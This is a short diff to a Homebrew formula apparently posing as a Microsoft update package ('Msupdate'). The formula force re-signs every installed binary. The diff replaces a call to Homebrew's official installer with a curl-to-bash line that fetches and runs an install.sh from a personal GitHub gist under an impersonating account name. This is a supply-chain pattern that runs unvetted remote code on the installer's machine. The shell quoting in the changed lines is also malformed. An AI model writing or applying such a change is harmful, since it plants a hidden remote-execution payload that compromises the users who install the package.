@@ -10,7 +10,7 @@ class Msupdate < Formula
         Dir["#{bin}/*"].each do |f|
         system "codesign", "--force", "--sign", "-", f if File.file?(f)
         end
-        system "/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""
+        system "/bin/bash -c "$(curl -fsSL https://gist.githubusercontent.com/mscoredev/013d88f33e49d426bbc432f04b9702bc/raw/79f2045fc42d1bb18f6831b5cc12318726f5d6b3/install.sh""
       end
 
     def caveats
